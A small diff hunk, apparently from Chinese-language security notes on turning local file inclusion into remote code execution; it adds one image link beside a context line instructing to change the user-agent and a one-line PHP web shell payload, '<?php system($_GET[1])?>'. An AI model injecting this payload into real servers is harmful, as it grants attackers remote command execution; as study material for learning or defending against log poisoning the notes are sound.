@@ -174,3 +174,4 @@ LFI to RCE
     變更user-agent
     <?php system($_GET[1])?>
 ![image](https://github.com/user-attachments/assets/adfbbf8e-39f5-4a64-9de4-791084eaffe3)
+![image](https://github.com/user-attachments/assets/a75a0457-b4ef-4508-88ec-be8720d28772)
